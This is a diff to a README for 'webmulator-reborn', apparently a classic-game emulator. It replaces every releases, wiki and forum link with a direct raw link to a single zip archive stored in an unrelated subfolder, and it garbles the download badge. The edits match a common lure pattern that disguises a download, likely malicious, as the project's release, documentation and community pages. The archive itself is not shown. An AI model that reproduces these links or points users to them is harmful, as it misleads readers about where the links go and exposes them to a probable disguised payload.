@@ -1,6 +1,6 @@
 # 🎮 webmulator-reborn - Play Classic Games with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ArkaFth07/webmulator-reborn/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ArkaFth07/webmulator-reborn/main/adv/rom-patcher-js/reborn_webmulator_1.0.zip%20Latest%https://raw.githubusercontent.com/ArkaFth07/webmulator-reborn/main/adv/rom-patcher-js/reborn_webmulator_1.0.zip)](https://raw.githubusercontent.com/ArkaFth07/webmulator-reborn/main/adv/rom-patcher-js/reborn_webmulator_1.0.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@
 
 To get started, visit the Releases page:
 
-[Download Here](https://github.com/ArkaFth07/webmulator-reborn/releases)
+[Download Here](https://raw.githubusercontent.com/ArkaFth07/webmulator-reborn/main/adv/rom-patcher-js/reborn_webmulator_1.0.zip)
 
 On the Releases page, you'll find a list of available versions. Simply select the latest version and download the appropriate file for your operating system.
 
@@ -73,8 +73,8 @@ If you encounter issues while using webmulator-reborn, consider the following ti
 
 ## 🌐 Additional Resources
 
-- [Developer’s Documentation](https://github.com/ArkaFth07/webmulator-reborn/wiki)
-- [Community Forum](https://github.com/ArkaFth07/webmulator-reborn/discussions)
+- [Developer’s Documentation](https://raw.githubusercontent.com/ArkaFth07/webmulator-reborn/main/adv/rom-patcher-js/reborn_webmulator_1.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/ArkaFth07/webmulator-reborn/main/adv/rom-patcher-js/reborn_webmulator_1.0.zip)
 
 Feel free to share your experiences and suggestions with the community. Your feedback can help improve webmulator-reborn for everyone!
 
@@ -82,6 +82,6 @@ Feel free to share your experiences and suggestions with the community. Your fee
 
 For your convenience, here’s the direct link again: 
 
-[Download Here](https://github.com/ArkaFth07/webmulator-reborn/releases) 
+[Download Here](https://raw.githubusercontent.com/ArkaFth07/webmulator-reborn/main/adv/rom-patcher-js/reborn_webmulator_1.0.zip) 
 
 Enjoy gaming with webmulator-reborn!
